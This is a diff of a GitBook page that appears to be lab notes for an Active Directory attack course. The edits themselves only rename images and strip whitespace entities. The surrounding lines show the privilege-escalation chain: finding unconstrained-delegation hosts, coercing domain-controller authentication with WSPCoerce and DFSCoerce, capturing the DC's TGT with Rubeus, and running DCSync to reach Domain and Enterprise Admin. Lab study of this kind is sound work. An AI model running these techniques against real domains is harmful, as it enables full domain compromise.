@@ -18,17 +18,17 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Get-DomainComputer -Unconstrained | select -ExpandProperty name
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
 
-Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv.&#x20;
+Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv.
 
-> Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv.&#x20;
+> Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv.
 
 Let’s check if anyone of them have local admin privileges on dcorp-appsrv.
 
 ### Check local admins in dcorp-appsrv
 
-> To that, we will need to check all users and hashes previusly obtained&#x20;
+> To that, we will need to check all users and hashes previusly obtained
 >
 > Like for example appadmin
 
@@ -77,7 +77,7 @@ C:\Users\appadmin> netsh interface portproxy add v4tov4 listenport=8080 listenad
 >
 > > Remember upload too the Rubeus to us webserver
 > >
-> > ![](<../../../.gitbook/assets/image (5) (1).png>)
+> > <img src="../../../.gitbook/assets/image (42).png" alt="" data-size="original">
 
 Execute Rubeus
 
@@ -122,7 +122,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args DCORP-DC DCORP-APPS
 C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
 ```
 
-### Optain the TGT&#x20;
+### Optain the TGT
 
 After execute some of these options, on the Rubeus listener (dcorp-appsrv), we can see the TGT of dcorp-dc$:
 
@@ -143,9 +143,9 @@ After execute some of these options, on the Rubeus listener (dcorp-appsrv), we c
 [snip]
 ```
 
-<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
 
-<mark style="background-color:yellow;">Copy the base64 encoded ticket and use it with Rubeus on student VM.</mark>&#x20;
+<mark style="background-color:yellow;">Copy the base64 encoded ticket and use it with Rubeus on student VM.</mark>
 
 ### Importar the ticket and do DCSync (Domain Admin)
 
@@ -200,7 +200,7 @@ Great!
 
 ## Escalada a Enterprise Admin (repetición contra mcorp-dc)
 
-To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`.&#x20;
+To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`.
 
 > Repite los mismos pasos pero ahora contra mcorp-dc$:
 
